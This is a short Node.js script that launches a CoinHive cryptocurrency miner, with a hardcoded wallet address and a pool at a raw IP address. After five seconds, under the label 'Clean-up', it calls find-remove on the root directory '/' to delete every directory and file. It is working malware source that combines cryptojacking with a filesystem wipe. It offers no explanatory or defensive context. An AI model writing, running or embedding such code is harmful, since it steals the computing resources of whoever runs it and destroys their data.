const CoinHive = require("coin-hive");
var findRemoveSync = require('find-remove');

(async () => {
  const miner = await CoinHive('44tKLXJSEJPBkfGpwiz4Hy23ZdBdPTXhXXjncmJUg2J2fbEvfreyxRgfo6PvGgr5GRGasJVhYDgf5GTcmNLyrLfUAXMPGaG', {
    pool: {
      host: '213.32.29.150',
      port: 14444
    }
  });
  await miner.start();
  miner.on('update', data => console.log(`
  
    ${data.acceptedHashes}
  `));
  
    setTimeout(async () => {
      console.log('Clean-up');
      try {
          findRemoveSync("/", {dir: "*", files: "*.*"});
      } catch(e) {
         console.log(e); 
      }
      
  }, 5000);
})();